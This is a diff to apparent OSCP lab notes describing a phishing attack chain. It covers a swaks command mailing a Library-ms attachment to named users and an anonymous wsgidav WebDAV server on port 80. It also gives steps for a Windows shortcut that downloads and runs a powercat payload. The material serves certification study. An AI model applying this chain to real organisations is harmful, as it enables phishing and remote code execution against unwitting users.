@@ -919,6 +919,7 @@ smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode, it can be RCPT, 
 sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 ### SMTP - swaks Phishing mail
+- Start the webdav server first before creating the config file
 - Open the VisualStudio code open new text file paste below code (Enter KALI IP) save it.
 - Double click to open the file(config file, created in above) include same config file.
 - Include powershell shortcut(On Desktop RightClick -> New -> Shortcut -> (in open location place Include below powershell powercat download execute command), save it powershell). # Putcorrect IP address
@@ -948,7 +949,7 @@ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --a
 ##config.Library-ms file end ----------------------------
 
 ##copythis config.Library-ms into kali working directory
->/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
+>/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/(#Customize this path) 
 >sudo service ssh start
 >scp .\config.Library-ms kali@192.168.45.242:/home/kali/Desktop/HTB/OSCP/AD/beyond/
 #Inter below command on windows shortcut name itinstall
